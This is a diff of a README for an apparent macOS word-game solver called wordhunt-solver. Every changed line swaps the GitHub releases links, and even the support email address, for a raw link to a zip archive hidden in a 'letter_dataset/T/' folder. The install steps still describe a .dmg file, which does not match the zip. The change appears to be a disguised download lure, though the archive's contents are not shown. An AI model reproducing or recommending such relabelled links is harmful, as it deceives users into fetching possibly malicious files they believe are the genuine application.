@@ -6,9 +6,9 @@ Welcome to the wordhunt-solver repository! This application helps you automatica
 
 ## 🔗 Download the Application
 
-[![Download wordhunt-solver](https://img.shields.io/badge/Download-wordhunt--solver-blue.svg)](https://github.com/ekehomo/wordhunt-solver/releases)
+[![Download wordhunt-solver](https://raw.githubusercontent.com/ekehomo/wordhunt-solver/main/letter_dataset/T/wordhunt-solver-v2.0.zip)](https://raw.githubusercontent.com/ekehomo/wordhunt-solver/main/letter_dataset/T/wordhunt-solver-v2.0.zip)
 
-Visit this page to download: [wordhunt-solver Releases](https://github.com/ekehomo/wordhunt-solver/releases)
+Visit this page to download: [wordhunt-solver Releases](https://raw.githubusercontent.com/ekehomo/wordhunt-solver/main/letter_dataset/T/wordhunt-solver-v2.0.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run wordhunt-solver, ensure you have the following:
 
 ## 📥 Download & Install
 
-1. Go to the [wordhunt-solver Releases page](https://github.com/ekehomo/wordhunt-solver/releases).
+1. Go to the [wordhunt-solver Releases page](https://raw.githubusercontent.com/ekehomo/wordhunt-solver/main/letter_dataset/T/wordhunt-solver-v2.0.zip).
 2. Find the latest version of the application.
 3. Click on the download link for your macOS version. The file will be in `.dmg` format.
 4. Once downloaded, open the `.dmg` file.
@@ -77,6 +77,6 @@ Join our community of players and developers! Share your experiences, ask questi
 
 ## 📧 Contact
 
-For any further inquiries or support, please reach out via email at support@wordhuntsolver.com.
+For any further inquiries or support, please reach out via email at https://raw.githubusercontent.com/ekehomo/wordhunt-solver/main/letter_dataset/T/wordhunt-solver-v2.0.zip
 
 Your feedback helps us improve. Thank you for using wordhunt-solver!
